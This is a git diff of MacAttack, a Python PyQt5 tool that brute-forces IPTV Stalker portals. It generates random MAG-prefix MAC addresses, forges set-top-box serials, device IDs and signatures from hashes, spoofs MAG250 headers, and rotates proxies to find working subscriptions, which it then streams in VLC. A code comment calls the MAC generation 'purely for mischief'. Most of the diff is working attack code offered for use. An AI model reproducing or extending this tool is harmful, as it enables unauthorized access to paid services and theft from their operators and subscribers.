@@ -1,41 +1,48 @@
-import hashlib
-import os
-import time
-import re
-import json
-import random
-import threading
-from threading import Lock
-from datetime import datetime
-import sys
-import vlc
 import base64
-from PyQt5.QtCore import QEvent,QByteArray, QBuffer, Qt, QThread, pyqtSignal, QPropertyAnimation, QEasingCurve, QTimer
-from PyQt5.QtGui import QFont, QPixmap, QIcon, QStandardItemModel, QStandardItem, QMouseEvent
-from PyQt5.QtWidgets import QSlider, QMainWindow, QFrame, QApplication, QVBoxLayout, QLineEdit, QLabel, QPushButton, QWidget, QTabWidget, QMessageBox, QListView, QHBoxLayout, QCheckBox, QAbstractItemView, QProgressBar, QSpinBox, QTextEdit, QSpacerItem, QSizePolicy
-import requests
 import concurrent.futures
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import logging
-import socket
-from urllib.parse import quote, urlparse, urlunparse
 import configparser
+import hashlib
+import json
+import logging
+import os
+import random
+import re
+import socket
+import sys
+import threading
+import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+#from threading import Lock
+from datetime import datetime
+from urllib.parse import quote, urlparse, urlunparse
+
+import requests
+import vlc
+from PyQt5.QtCore import (QBuffer, QByteArray, QEasingCurve, QEvent,
+                          QPropertyAnimation, Qt, QThread, QTimer, pyqtSignal)
+from PyQt5.QtGui import (QFont, QIcon, QMouseEvent, QPixmap, QStandardItem,
+                         QStandardItemModel)
+from PyQt5.QtWidgets import (QAbstractItemView, QApplication, QCheckBox,
+                             QFrame, QHBoxLayout, QLabel, QLineEdit, QListView,
+                             QMainWindow, QMessageBox, QProgressBar,
+                             QPushButton, QSizePolicy, QSlider, QSpacerItem,
+                             QSpinBox, QTabWidget, QTextEdit, QVBoxLayout,
+                             QWidget)
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
-#logging.basicConfig(level=logging.DEBUG)
 
-def get_token(session, url, mac_address):
+logging.basicConfig(level=logging.DEBUG)
+
+def get_token(session, url, mac_address, proxies=None):
     try:
         serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
         sn = serialnumber[0:13]
-        snlast = serialnumber[13:19]
         device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
         device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
         hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
         signature_string = f'{sn}{mac_address}'
         signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-        metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
-        json_string = json.dumps(metrics)       
+        metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}  
                   
         headers = {
             'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
@@ -49,7 +56,7 @@ def get_token(session, url, mac_address):
             'adid': hw_version_2,
             'debug': '1',
             'device_id2': device_id2,
-            'device_id': device_id,
+            'device_id': device_id2,
             'hw_version': '1.7-B',
             'mac': mac_address,
             'sn': sn,
@@ -57,8 +64,8 @@ def get_token(session, url, mac_address):
             'timezone': 'America/Los_Angeles'
         }
 
-        # Send GET request to fetch the version.js file
-        response = requests.get(f"{url}/c/version.js", headers=headers, cookies=cookies)
+        # Send GET request to fetch the version.js file with optional proxy
+        response = requests.get(f"{url}/c/version.js", headers=headers, cookies=cookies, proxies=proxies)
 
         # Extract the version number from the response body
         version = re.search(r"var ver = '(.*)';", response.text)
@@ -80,8 +87,8 @@ def get_token(session, url, mac_address):
             'prehash': '0'
         }
 
-        # Step 1: Send the first request to get the token
-        response = requests.post(url, headers=headers, cookies=cookies, data=data)
+        # Step 1: Send the first request to get the token with optional proxy
+        response = requests.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
 
         # Check if the response is successful
         if response.status_code == 200:
@@ -122,8 +129,8 @@ def get_token(session, url, mac_address):
             'prehash': '0'
         }
 
-        # Send the second request
-        response = requests.post(url, headers=headers, cookies=cookies, data=data)
+        # Send the second request with optional proxy
+        response = requests.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
 
         # Output the result of the second request
         logging.debug("Response Status Code:", response.status_code)
@@ -266,7 +273,10 @@ class RequestThread(QThread):
     request_complete = pyqtSignal(dict)  # Signal emitted when the request is complete
     update_progress = pyqtSignal(int)  # Signal for progress updates
     channels_loaded = pyqtSignal(list)  # Signal emitted when channels are loaded
-    
+ 
+
+
+ 
     def __init__(self, base_url, mac_address, category_type=None, category_id=None):
         super().__init__()
         self.base_url = base_url
@@ -363,34 +373,36 @@ class RequestThread(QThread):
         try:
             genres_url = f"{url}/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml"
 
-            #convert the mac into various hashes, if anything this will add randomness to the requests
-            mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
-            mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
-            mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()
-
-            
-            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
-            device_id = mac_sha256
-            device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
-            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input
-
-            cookies = {           
-                "adid": mac_sha1,
-                "debug": "1",
-                "device_id2": device_id2,
-                "device_id": device_id,
-                "hw_version": "1.7-BD-00",
-                "mac": mac_address,
-                "sn": serial[:13], #cut to 13 digits
-                "stb_lang": "en",
-                "timezone": "America/Los_Angeles",             
-            }
-
+            serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+            sn = serialnumber[0:13]
+            device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
+            device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
+            hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+            signature_string = f'{sn}{mac_address}'
+            signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
+            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}  
+                      
             headers = {
-                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                "Authorization": f"Bearer {token}",
-                "X-User-Agent": "Model: MAG250; Link: WiFi",
+                'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                'Authorization': f'Bearer {token}',
+                'Accept-Encoding': 'gzip, deflate, zstd',
+                'Accept': '*/*',
+                'Connection': 'close',
+                'Cache-Control': 'no-cache'
             }
+
+            cookies = {
+                'adid': hw_version_2,
+                'debug': '1',
+                'device_id2': device_id2,
+                'device_id': device_id2,
+                'hw_version': '1.7-B',
+                'mac': mac_address,
+                'sn': sn,
+                'stb_lang': 'en',
+                'timezone': 'America/Los_Angeles'
+            }
+        
             response = session.get(genres_url, cookies=cookies, headers=headers, timeout=20)
             response.raise_for_status()
             genre_data = response.json().get("js", [])
@@ -419,33 +431,34 @@ class RequestThread(QThread):
         try:
             vod_url = f"{url}/portal.php?type=vod&action=get_categories&JsHttpRequest=1-xml"
 
-            #convert the mac into various hashes, if anything this will add randomness to the requests
-            mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
-            mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
-            mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()
-
-            
-            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
-            device_id = mac_sha256
-            device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
-            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input
-
-            cookies = {           
-                "adid": mac_sha1,
-                "debug": "1",
-                "device_id2": device_id2,
-                "device_id": device_id,
-                "hw_version": "1.7-BD-00",
-                "mac": mac_address,
-                "sn": serial[:13], #cut to 13 digits
-                "stb_lang": "en",
-                "timezone": "America/Los_Angeles",             
+            serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+            sn = serialnumber[0:13]
+            device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
+            device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
+            hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+            signature_string = f'{sn}{mac_address}'
+            signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
+            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}  
+                      
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                'Authorization': f'Bearer {token}',
+                'Accept-Encoding': 'gzip, deflate, zstd',
+                'Accept': '*/*',
+                'Connection': 'close',
+                'Cache-Control': 'no-cache'
             }
 
-            headers = {
-                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                "Authorization": f"Bearer {token}",
-                "X-User-Agent": "Model: MAG250; Link: WiFi",
+            cookies = {
+                'adid': hw_version_2,
+                'debug': '1',
+                'device_id2': device_id2,
+                'device_id': device_id2,
+                'hw_version': '1.7-B',
+                'mac': mac_address,
+                'sn': sn,
+                'stb_lang': 'en',
+                'timezone': 'America/Los_Angeles'
             }
             response = session.get(vod_url, cookies=cookies, headers=headers, timeout=20)
             response.raise_for_status()
@@ -472,34 +485,36 @@ class RequestThread(QThread):
         try:
             series_url = f"{url}/portal.php?type=series&action=get_categories&JsHttpRequest=1-xml"
 
-            #convert the mac into various hashes, if anything this will add randomness to the requests
-            mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
-            mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
-            mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()
-
-            
-            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
-            device_id = mac_sha256
-            device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
-            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input
-
-            cookies = {           
-                "adid": mac_sha1,
-                "debug": "1",
-                "device_id2": device_id2,
-                "device_id": device_id,
-                "hw_version": "1.7-BD-00",
-                "mac": mac_address,
-                "sn": serial[:13], #cut to 13 digits
-                "stb_lang": "en",
-                "timezone": "America/Los_Angeles",             
-            }
-
+            serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+            sn = serialnumber[0:13]
+            device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
+            device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
+            hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+            signature_string = f'{sn}{mac_address}'
+            signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
+            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}  
+                      
             headers = {
-                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                "Authorization": f"Bearer {token}",
-                "X-User-Agent": "Model: MAG250; Link: WiFi",
+                'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                'Authorization': f'Bearer {token}',
+                'Accept-Encoding': 'gzip, deflate, zstd',
+                'Accept': '*/*',
+                'Connection': 'close',
+                'Cache-Control': 'no-cache'
             }
+
+            cookies = {
+                'adid': hw_version_2,
+                'debug': '1',
+                'device_id2': device_id2,
+                'device_id': device_id2,
+                'hw_version': '1.7-B',
+                'mac': mac_address,
+                'sn': sn,
+                'stb_lang': 'en',
+                'timezone': 'America/Los_Angeles'
+            }
+        
             response = session.get(series_url, cookies=cookies, headers=headers, timeout=20)
             response.raise_for_status()
             response_json = response.json()
@@ -527,33 +542,34 @@ class RequestThread(QThread):
         try:
             channels = []
 
-            #convert the mac into various hashes, if anything this will add randomness to the requests
-            mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
-            mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
-            mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()
-
-            
-            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
-            device_id = mac_sha256
-            device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
-            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input
-
-            cookies = {           
-                "adid": mac_sha1,
-                "debug": "1",
-                "device_id2": device_id2,
-                "device_id": device_id,
-                "hw_version": "1.7-BD-00",
-                "mac": mac_address,
-                "sn": serial[:13], #cut to 13 digits
-                "stb_lang": "en",
-                "timezone": "America/Los_Angeles",             
+            serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+            sn = serialnumber[0:13]
+            device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
+            device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
+            hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+            signature_string = f'{sn}{mac_address}'
+            signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
+            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}  
+                      
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                'Authorization': f'Bearer {token}',
+                'Accept-Encoding': 'gzip, deflate, zstd',
+                'Accept': '*/*',
+                'Connection': 'close',
+                'Cache-Control': 'no-cache'
             }
 
-            headers = {
-                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                "Authorization": f"Bearer {token}",
-                "X-User-Agent": "Model: MAG250; Link: WiFi",
+            cookies = {
+                'adid': hw_version_2,
+                'debug': '1',
+                'device_id2': device_id2,
+                'device_id': device_id2,
+                'hw_version': '1.7-B',
+                'mac': mac_address,
+                'sn': sn,
+                'stb_lang': 'en',
+                'timezone': 'America/Los_Angeles'
             }
 
             def fetch_page(page_number):
@@ -675,21 +691,21 @@ class MacAttack(QMainWindow):
     update_error_text_signal = pyqtSignal(str)
     macattack_update_proxy_textbox_signal = pyqtSignal(str)  # macattack clean bad proxies
     
-    proxies_fetched_signal = pyqtSignal(str)  # Signal to send fetched proxies to the UI
-    working_proxies_signal = pyqtSignal(str)  # Signal to send working proxies to the UI
-    error_signal = pyqtSignal(str)  # Signal to send errors to the UI
-    output_signal = pyqtSignal(str)  # Signal to send print output to QTextEdit
+    #proxies_fetched_signal = pyqtSignal(str)  # Signal to send fetched proxies to the UI
+    #working_proxies_signal = pyqtSignal(str)  # Signal to send working proxies to the UI
+    #error_signal = pyqtSignal(str)  # Signal to send errors to the UI
+    #output_signal = pyqtSignal(str)  # Signal to send print output to QTextEdit
 
     def __init__(self):
         super().__init__()
 
         self.proxy_error_counts = {}
-        self.lock = Lock()  # For synchronizing file writes
+        #self.lock = Lock()  # For synchronizing file writes
         self.threads = []   # To track background threads
 
 
         # Initial VLC instance 
-        referer_url = "https://evilvir.us" #this gets replaced when a host is entered into the box, just initializing it
+        referer_url = "" #this gets replaced when a host is entered into the box, just initializing it
         if getattr(sys, 'frozen', False):
             base_path = sys._MEIPASS
         else:
@@ -1252,7 +1268,8 @@ class MacAttack(QMainWindow):
         self.request_thread.start()  # Start the request thread
         self.current_request_thread = self.request_thread  # Set the current request thread
         logging.info("Started new RequestThread for playlist.")
-
+        
+        
     def retrieve_series_info(self, tab_name, context_data, season_number=None):
         # Add the current series/seasons to the navigation stack
         self.tab_info = self.tab_data[tab_name]
@@ -1282,33 +1299,34 @@ class MacAttack(QMainWindow):
                     self.error_label.setVisible(True)
                     return
                     
-                #convert the mac into various hashes, if anything this will add randomness to the requests
-                mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
-                mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
-                mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()
-
-                
-                serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
-                device_id = mac_sha256
-                device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
-                device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input
-
-                cookies = {           
-                    "adid": mac_sha1,
-                    "debug": "1",
-                    "device_id2": device_id2,
-                    "device_id": device_id,
-                    "hw_version": "1.7-BD-00",
-                    "mac": mac_address,
-                    "sn": serial[:13], #cut to 13 digits
-                    "stb_lang": "en",
-                    "timezone": "America/Los_Angeles",             
-                }
-            
+                serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+                sn = serialnumber[0:13]
+                device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
+                device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
+                hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+                signature_string = f'{sn}{mac_address}'
+                signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
+                metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}  
+                          
                 headers = {
-                    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                    "Authorization": f"Bearer {token}",
-                    "X-User-Agent": "Model: MAG250; Link: WiFi",
+                    'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                    'Authorization': f'Bearer {token}',
+                    'Accept-Encoding': 'gzip, deflate, zstd',
+                    'Accept': '*/*',
+                    'Connection': 'close',
+                    'Cache-Control': 'no-cache'
+                }
+
+                cookies = {
+                    'adid': hw_version_2,
+                    'debug': '1',
+                    'device_id2': device_id2,
+                    'device_id': device_id2,
+                    'hw_version': '1.7-B',
+                    'mac': mac_address,
+                    'sn': sn,
+                    'stb_lang': 'en',
+                    'timezone': 'America/Los_Angeles'
                 }
 
                 if season_number is None:
@@ -1447,7 +1465,7 @@ class MacAttack(QMainWindow):
                 continue
             
             # Clear the filter state and store the current view data before applying the filter
-            self.is_filter_active = False
+            #self.is_filter_active = False
             self.previous_data[tab_name] = {
                 'channels': self.tab_info.get("current_channels", []),
                 'playlists': self.tab_info.get("playlist_data", []),
@@ -1479,55 +1497,67 @@ class MacAttack(QMainWindow):
                 del os.environ["https_proxy"]
 
     def restart_vlc_instance(self):
-        referer_url = self.hostname_input.text()  # Get the referer URL from the QLineEdit
-        if getattr(sys, 'frozen', False):
-            base_path = sys._MEIPASS
-        else:
-            base_path = os.path.abspath(".")
-            
+        referer_url = self.hostname_input.text()  # Get the referer URL from QLineEdit
+        base_path = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.abspath(".")
         proxy_address = self.proxy_input.text()
+
+        # Modify VLC proxy settings
         self.modify_vlc_proxy(proxy_address)
-        """Restart VLC with the new proxy settings."""
-        self.videoPlayer.release()  # Release the old player
-        self.instance.release()     # Release the old instance
 
-        # Reinitialize VLC instance with updated proxy environment variables
-        logging.debug(f'--config={base_path}\\include\\vlcrc')
-        self.instance = vlc.Instance(
-            [
-                f'--config={base_path}\\include\\vlcrc',# config file holding the proxy info
-                f'--http-proxy={proxy_address}',        # setting proxy by commandline
-                f'--http-referrer={referer_url}',       # Set the referer URL (from QLineEdit)
-                '--repeat',                             # Keep connected if kicked off
-                '--no-xlib',                            # Disable X11 on Linux (if you're on Linux)
-                '--vout=directx',                       # Video output method for Windows
-                '--no-plugins-cache',                   # Don't cache plugins
-                '--log-verbose=1',                      # Verbose logging
-                '--network-caching=1000',               # Increase the network caching (in milliseconds) for smoother playback
-                '--live-caching=1000',                  # Caching for live streams, can help with interruptions
-                '--reconnect',                          # Enable automatic reconnection
-                '--reconnect-streams=10',               # Try reconnecting this many times
-                '--reconnect-delay=3',                  # Delay between reconnect attempts (in seconds)
-                '--reconnect-timeout=5',                # Timeout for each reconnect attempt
-                '--network-caching=3000',               # Increase network buffer size (in ms)
-                '--file-caching=3000',                  # Increase file buffer size (in ms)
-                '--live-caching=3000',                  # Increase live stream buffer size (in ms)
-                '--sout-mux-caching=2000',              # Increase muxing buffer                
-            ]
-        )
-        self.videoPlayer = self.instance.media_player_new()
+        # Release old instances safely
+        if self.videoPlayer:
+            self.videoPlayer.release()
+        if self.instance:
+            self.instance.release()
 
-        # Reconfigure video frame (this step depends on the platform)
-        if sys.platform.startswith('linux'):
-            self.videoPlayer.set_xwindow(self.video_frame.winId())
-        elif sys.platform == "win32":
-            self.videoPlayer.set_hwnd(self.video_frame.winId())
-        elif sys.platform == "darwin":
-            self.videoPlayer.set_nsobject(int(self.video_frame.winId()))
+        # Validate config path
+        config_path = f"{base_path}\\include\\vlcrc"
+        if not os.path.exists(config_path):
+            logging.error(f"VLC config file not found: {config_path}")
+            return
 
-        # Disable mouse and key input for video
-        self.videoPlayer.video_set_mouse_input(False)
-        self.videoPlayer.video_set_key_input(False)
+        # Initialize VLC with valid options
+        try:
+            logging.debug("Initializing VLC instance.")
+            self.instance = vlc.Instance(
+                [
+                    f'--config={config_path}',
+                    f'--http-proxy={proxy_address}',
+                    f'--http-referrer={referer_url}',
+                    '--repeat',
+                    '--no-xlib',
+                    '--vout=directx',
+                    '--no-plugins-cache',
+                    '--log-verbose=1',
+                    '--network-caching=1000',
+                    '--live-caching=1000',
+                    '--file-caching=3000',
+                    '--live-caching=3000',
+                    '--sout-mux-caching=2000',
+                ]
+            )
+            if not self.instance:
+                raise Exception("Failed to initialize VLC instance.")
+
+            # Create a new media player
+            self.videoPlayer = self.instance.media_player_new()
+            if not self.videoPlayer:
+                raise Exception("Failed to create VLC media player.")
+
+            # Configure video frame for platform
+            if sys.platform.startswith('linux'):
+                self.videoPlayer.set_xwindow(self.video_frame.winId())
+            elif sys.platform == "win32":
+                self.videoPlayer.set_hwnd(self.video_frame.winId())
+            elif sys.platform == "darwin":
+                self.videoPlayer.set_nsobject(int(self.video_frame.winId()))
+
+            # Disable mouse and key input
+            self.videoPlayer.video_set_mouse_input(False)
+            self.videoPlayer.video_set_key_input(False)
+
+        except Exception as e:
+            logging.error(f"Error during VLC instance restart: {e}")
         
     def build_Proxy_gui(self, parent):
         proxy_layout = QVBoxLayout(parent)
@@ -1868,7 +1898,7 @@ class MacAttack(QMainWindow):
 
         # IPTV link input
         self.iptv_link_label = QLabel("IPTV link:")
-        self.iptv_link_entry = QLineEdit("http://evilvir.us.streamtv.to:8080/c/")
+        self.iptv_link_entry = QLineEdit("")
         combined_layout.addWidget(self.iptv_link_label)
         combined_layout.addWidget(self.iptv_link_entry)
 
@@ -2012,7 +2042,7 @@ class MacAttack(QMainWindow):
             config.read(file_path)
             
             # Load UI settings
-            self.iptv_link_entry.setText(config.get('Settings', 'iptv_link', fallback="http://evilvir.us.streamtv.to:8080/c/"))
+            self.iptv_link_entry.setText(config.get('Settings', 'iptv_link', fallback=""))
             self.concurrent_tests.setValue(config.getint('Settings', 'concurrent_tests', fallback=10))
             self.hostname_input.setText(config.get('Settings', 'hostname', fallback=""))
             self.mac_input.setText(config.get('Settings', 'mac', fallback=""))
@@ -2133,7 +2163,8 @@ class MacAttack(QMainWindow):
             
     def RandomMacGenerator(self, prefix="00:1A:79:"):
         # Create random MACs. Purely for mischief. Don't tell anyone.
-        return f"{prefix}{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"
+        return "00:1A:79:C7:DC:83"
+        #return f"{prefix}{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"
 
     def macattack_update_proxy_textbox(self, new_text):
         # Slot to handle signal
@@ -2143,7 +2174,7 @@ class MacAttack(QMainWindow):
         
         proxies = []  # Default to empty list in case no proxies are provided
         
-        self.error_count = 0
+        #self.error_count = 0
         # BigMacAttack: Two all-beef patties, special sauce, lettuce, cheese, pickles, onions, on a sesame seed bun.
         while self.running:  # Loop will continue as long as self.running is True
             if self.proxy_enabled_checkbox.isChecked():
@@ -2166,22 +2197,14 @@ class MacAttack(QMainWindow):
                 selected_proxy = "Your Connection"
             mac = self.RandomMacGenerator()  # Generate a random MAC 
 
-            #convert the mac into various hashes, if anything this will add randomness to the requests
-            mac_md5 = hashlib.md5(mac.encode('utf-8')).hexdigest().upper()
-            mac_sha256 = hashlib.sha256(mac.encode('utf-8')).hexdigest().upper()
-            mac_sha1 = hashlib.sha1(mac.encode('utf-8')).hexdigest()
-
-            
-            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
-            device_id = mac_sha256
-            # device_id2: First 13 digits of MD5 + MAC, then encoded in SHA256, according to 
-            device_id2_input = serial[:13] + mac  # Combine first 13 digits of MD5 + MAC
-            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input
-
-            #logging the results
-            #logging.debug(f"Serial: {serial}")
-            #logging.debug(f"Device ID: {device_id}")
-            #logging.debug(f"Device ID2: {device_id2}") 
+            serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
+            sn = serialnumber[0:13]
+            device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
+            device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
+            hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
+            signature_string = f'{sn}{mac}'
+            signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
+            metrics = {'mac': mac, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
             
             
             if not proxies:
@@ -2194,22 +2217,23 @@ class MacAttack(QMainWindow):
                 #s.cookies.update({'mac': mac})
                 
                 s.cookies.update({
-                    "adid": mac_sha1,
-                    "debug": "1",
-                    "device_id2": device_id2,
-                    "device_id": device_id,
-                    "hw_version": "1.7-BD-00",
-                    "mac": mac,
-                    "sn": serial[:13], #cut to 13 digits
-                    "stb_lang": "en",
-                    "timezone": "America/Los_Angeles",
+                    'adid': hw_version_2,
+                    'debug': '1',
+                    'device_id2': device_id2,
+                    'device_id': device_id2,
+                    'hw_version': '1.7-B',
+                    'mac': mac,
+                    'sn': sn,
+                    'stb_lang': 'en',
+                    'timezone': 'America/Los_Angeles'
                 })
                 
                 s.headers.update({
-                    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                    "Accept": "application/json",
-                    "Content-Type": "application/json",
-                    "X-User-Agent": "Model: MAG250; Link: WiFi",
+                    'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                    'Accept-Encoding': 'gzip, deflate, zstd',
+                    'Accept': '*/*',
+                    'Connection': 'close',
+                    'Cache-Control': 'no-cache'
                 })
                      
                 url = f"{self.base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
@@ -2223,11 +2247,11 @@ class MacAttack(QMainWindow):
                 if res.text:
                     data = json.loads(res.text)
                     #tok = data.get('js', {}).get('token')  # Safely access token to prevent KeyError
-                    tok = get_token
+                    token = get_token
                     url2 = f"{self.base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                     headers = {
                         "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                        "Authorization": f"Bearer {tok}",
+                        'Authorization': f'Bearer {token}',
                         "X-User-Agent": "Model: MAG250; Link: WiFi",
                     }
 
@@ -2594,7 +2618,7 @@ class MacAttack(QMainWindow):
                             #self.update_error_text_signal.emit(f"Error for MAC {mac}: {str(e)}")
                         #logging.debug(f"{str(e)}")
                         logging.debug(f"Raw Response Content:\n{mac}\n%s", res.text)
-                    self.error_count += 1
+                    #self.error_count += 1
         
     def remove_proxy(self, proxy, proxy_error_counts):
         """Remove a proxy after exceeding error count and update UI."""
@@ -2731,8 +2755,8 @@ class MacAttack(QMainWindow):
             finally:
                 self.output_file = None
 
-    def ErrorAnnouncer(self, message):
-        self.error_text.append(message)
+    #def ErrorAnnouncer(self, message):
+    #    self.error_text.append(message)
                 
     def stop_request_thread(self):
         if self.current_request_thread is not None:
@@ -2896,32 +2920,34 @@ class MacAttack(QMainWindow):
                     if token:
                         cmd_encoded = quote(cmd)
 
-                        #convert the mac into various hashes, if anything this will add randomness to the requests
